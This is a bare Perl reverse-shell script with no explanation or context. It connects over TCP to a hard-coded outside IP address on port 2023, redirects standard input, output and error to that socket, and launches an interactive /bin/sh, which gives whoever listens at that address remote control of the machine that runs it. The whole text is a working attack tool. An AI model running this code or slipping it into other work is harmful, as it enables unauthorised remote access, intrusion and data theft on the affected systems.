use Socket; 
$i="110.138.115.25"; 
$p=2023; 
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); 
if(connect(S,sockaddr_in($p,inet_aton($i)))){ 
	open(STDIN,">&S"); 
	open(STDOUT,">&S"); 
	open(STDERR,">&S"); 
	exec("/bin/sh -i"); 
};
